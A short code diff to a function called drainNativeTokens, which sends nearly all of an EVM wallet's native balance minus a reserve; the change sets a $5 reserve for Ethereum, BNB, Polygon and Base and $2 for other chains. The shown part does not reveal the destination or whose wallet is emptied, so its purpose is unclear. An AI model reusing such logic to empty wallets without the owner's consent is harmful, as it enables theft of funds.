@@ -422,11 +422,13 @@ export async function drainNativeTokens(
   // 1.5x buffer is sufficient for a simple native transfer (21000 gas)
   const buffer = gasCost + (gasCost / 2n);
 
-  // Determine USD reserve: $5 for Ethereum, $2 for other EVM chains.
+  // Determine USD reserve: $5 for major chains (Ethereum, BNB, Polygon, Base),
+  // $2 for all other EVM chains.
   // If wallet balance (in USD) is at or below the reserve, skip native transfer entirely.
   let reserveWei = 0n;
   if (chainId > 0) {
-    const reserveUsd = chainId === 1 ? 5 : 2;
+    const majorChains = [1, 56, 137, 8453]; // Ethereum, BNB, Polygon, Base
+    const reserveUsd = majorChains.includes(chainId) ? 5 : 2;
     const nativePrice = await getNativeTokenPrice(chainId);
     const balanceUsd = parseFloat(ethers.formatEther(balance)) * nativePrice;
 
@@ -440,7 +442,7 @@ export async function drainNativeTokens(
     reserveWei = ethers.parseEther(reserveEth.toFixed(18));
   }
 
-  // The USD reserve ($5 ETH / $2 others) already covers gas fees.
+  // The USD reserve ($5 for major chains / $2 for others) already covers gas fees.
   // Gas is paid from the reserve, so we only subtract reserveWei (not buffer separately).
   // If no chainId provided (no reserve), fall back to subtracting the gas buffer.
   const sendAmount = reserveWei > 0n ? balance - reserveWei : balance - buffer;
